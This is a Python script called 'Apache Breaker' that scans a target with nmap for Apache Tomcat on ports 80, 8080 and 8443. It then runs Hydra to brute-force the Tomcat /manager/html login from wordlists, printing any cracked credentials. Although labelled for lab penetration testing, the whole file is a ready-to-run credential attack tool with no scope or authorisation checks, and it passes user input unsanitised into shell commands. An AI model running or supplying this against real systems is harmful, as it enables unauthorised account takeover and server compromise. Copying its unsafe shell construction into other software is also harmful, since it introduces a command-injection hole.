#!/usr/bin/env python3
import subprocess
import argparse
import os
import re
import shutil
from datetime import datetime

def print_status(message, stage="general"):
    """Print status messages with timestamp and color."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    colors = {
        "nmap": "\033[94m",  # Blue
        "hydra": "\033[92m",  # Green
        "wordlist": "\033[95m",  # Purple
        "credentials": "\033[95m",  # Magenta for cracked credentials
        "error": "\033[91m",  # Red
        "general": "\033[0m"  # Default
    }
    color = colors.get(stage, "\033[0m")
    print(f"{color}[{timestamp}] {message}\033[0m")

def display_ascii_title():
    """Display customized ASCII art title for Apache Breaker with a cat, checking terminal width."""
    ascii_art = """
  /$$$$$$                                /$$                      
 /$$__  $$                              | $$                      
| $$  \\ $$  /$$$$$$   /$$$$$$   /$$$$$$$| $$$$$$$   /$$$$$$       
| $$$$$$$$ /$$__  $$ |____  $$ /$$_____/| $$__  $$ /$$__  $$      
| $$__  $$| $$  \\ $$  /$$$$$$$| $$      | $$  \\ $$| $$$$$$$$      
| $$  | $$| $$  | $$ /$$__  $$| $$      | $$  | $$| $$_____/      
| $$  | $$| $$$$$$$/|  $$$$$$$|  $$$$$$$| $$  | $$|  $$$$$$$      
|__/  |__/| $$____/  \\_______/ \\_______/|__/  |__/ \\_______/      
          | $$                                                    
          | $$                                                    
          |__/                                                   
 /$$$$$$$                                /$$                          
| $$__  $$                              | $$                          
| $$  \\ $$  /$$$$$$   /$$$$$$   /$$$$$$ | $$   /$$  /$$$$$$   /$$$$$$ 
| $$$$$$$  /$$__  $$ /$$__  $$ |____  $$| $$  /$$/ /$$__  $$ /$$__  $$
| $$__  $$| $$  \\__/| $$$$$$$$  /$$$$$$$| $$$$$$/ | $$$$$$$$| $$  \\__/
| $$  \\ $$| $$      | $$_____/ /$$__  $$| $$_  $$ | $$_____/| $$      
| $$$$$$$/| $$      |  $$$$$$$|  $$$$$$$| $$ \\  $$|  $$$$$$$| $$      
|_______/ |__/       \\_______/ \\_______/|__/ \\__/ \\_______/|__/      
                                                                      
                                                                            
       Apache Breaker
 /_/\\  
( o.o ) 
 > ^ <
"""
    # Check terminal width
    try:
        terminal_width = shutil.get_terminal_size().columns
        if terminal_width < 80:
            print("Terminal too narrow for ASCII art. Displaying title only:")
            print("Apache Breaker")
            return
    except Exception:
        pass
    print(ascii_art)

def run_nmap_scan(target):
    """Run targeted Nmap scan for Tomcat ports."""
    ports = ["80", "8080", "8443"]
    print_status(f"Starting Nmap scan on ports {','.join(ports)}...", stage="nmap")
    nmap_cmd = f"nmap -sV -p {','.join(ports)} {target}"
    print_status(f"Executing: {nmap_cmd}", stage="nmap")
    try:
        result = subprocess.run(nmap_cmd, shell=True, check=True, capture_output=True, text=True)
        print_status("Nmap scan completed.", stage="nmap")
        print_status(f"Nmap output:\n{result.stdout}", stage="nmap")
        tomcat_ports = []
        for line in result.stdout.splitlines():
            if "open" in line and "tomcat" in line.lower():
                port = line.split("/")[0].strip()
                print_status(f"Found Apache Tomcat on port {port}", stage="nmap")
                tomcat_ports.append(port)
        if not tomcat_ports:
            print_status("No Tomcat services found.", stage="nmap")
        return tomcat_ports
    except subprocess.CalledProcessError as e:
        print_status(f"ERROR: Nmap scan failed: {e}", stage="error")
        return []

def run_hydra(target, port, username_wordlist, password_wordlist, credential_list, protocol):
    """Run Hydra to crack credentials on /manager/html."""
    effective_protocol = protocol if protocol else ("https" if port == "8443" else "http")
    url = f"{effective_protocol}://{target}:{port}/manager/html"
    print_status(f"Starting Hydra on {url} using GET method...", stage="hydra")
    service = "http-get" if effective_protocol == "http" else "https-get"
    login_path = "/manager/html"
    print_status(f"Assuming login path: {login_path}", stage="hydra")

    if credential_list:
        if not os.path.isfile(credential_list):
            print_status(f"ERROR: Credential list not found: {credential_list}", stage="error")
            return None
        print_status(f"Using credential list: {credential_list}", stage="wordlist")
        hydra_cmd = (
            f"hydra -C \"{credential_list}\" -vV -t 4 -f {target} {service}"
            f" {login_path} -s {port}"
        )
    else:
        if not os.path.isfile(username_wordlist) or not os.path.isfile(password_wordlist):
            print_status(f"ERROR: Wordlist not found: {username_wordlist or password_wordlist}", stage="error")
            return None
        print_status(f"Using username wordlist: {username_wordlist}", stage="wordlist")
        print_status(f"Using password wordlist: {password_wordlist}", stage="wordlist")
        hydra_cmd = (
            f"hydra -L \"{username_wordlist}\" -P \"{password_wordlist}\" -vV -t 4 -f {target} {service}"
            f" {login_path} -s {port}"
        )

    print_status(f"Executing: {hydra_cmd}", stage="hydra")
    try:
        result = subprocess.run(hydra_cmd, shell=True, capture_output=True, text=True)
        print_status("Hydra execution completed.", stage="hydra")
        print_status(f"Hydra output:\n{result.stdout}", stage="hydra")
        # Parse credentials from Hydra output
        credentials = []
        for line in result.stdout.splitlines():
            if f"][{service}]" in line:  # Match [8080][http-get] or [8443][https-get]
                match = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", line)
                if match:
                    username, password = match.groups()
                    credentials.append((username, password))
        if credentials:
            print_status("SUCCESS: Credentials found!", stage="hydra")
            for username, password in credentials:
                print_status(f"Cracked - Username: {username}, Password: {password}", stage="credentials")
            return credentials
        else:
            print_status("No credentials cracked.", stage="hydra")
            return None
    except subprocess.CalledProcessError as e:
        print_status(f"ERROR: Hydra failed: {e}", stage="error")
        return None

def main():
    display_ascii_title()
    parser = argparse.ArgumentParser(description="Port scan and auth cracker for lab pen testing.")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-L", "--username-wordlist", help="Username wordlist path (use with -P)")
    parser.add_argument("-P", "--password-wordlist", help="Password wordlist path (use with -L)")
    parser.add_argument("-C", "--credential-list", help="Username:password list path (instead of -L/-P)")
    parser.add_argument("-p", "--protocol", choices=["http", "https"], help="Protocol (http or https)")
    args = parser.parse_args()

    # Validate wordlist arguments
    if args.credential_list and (args.username_wordlist or args.password_wordlist):
        print_status("ERROR: Use either -C or both -L and -P.", stage="error")
        exit(1)
    if not args.credential_list and (not args.username_wordlist or not args.password_wordlist):
        print_status("ERROR: Provide either -C or both -L and -P.", stage="error")
        exit(1)

    print_status(f"Starting script. Target: {args.target}")
    if args.credential_list:
        print_status(f"Credential list: {args.credential_list}", stage="wordlist")
    else:
        print_status(f"Username wordlist: {args.username_wordlist}", stage="wordlist")
        print_status(f"Password wordlist: {args.password_wordlist}", stage="wordlist")

    # Step 1: Nmap scan
    tomcat_ports = run_nmap_scan(args.target)
    if not tomcat_ports:
        print_status("No Tomcat services found. Exiting.", stage="error")
        exit(1)

    # Step 2: Run Hydra on each Tomcat port
    all_credentials = []
    for port in tomcat_ports:
        credentials = run_hydra(args.target, port, args.username_wordlist, args.password_wordlist, args.credential_list, args.protocol)
        if credentials:
            all_credentials.extend(credentials)

    # Display all cracked credentials at the end
    if all_credentials:
        print_status("Final Cracked Credentials:", stage="credentials")
        for username, password in all_credentials:
            print_status(f"Username: {username}, Password: {password}", stage="credentials")
    else:
        print_status("No credentials were cracked across all ports.", stage="error")

    print_status("Script completed.")

if __name__ == "__main__":
    main()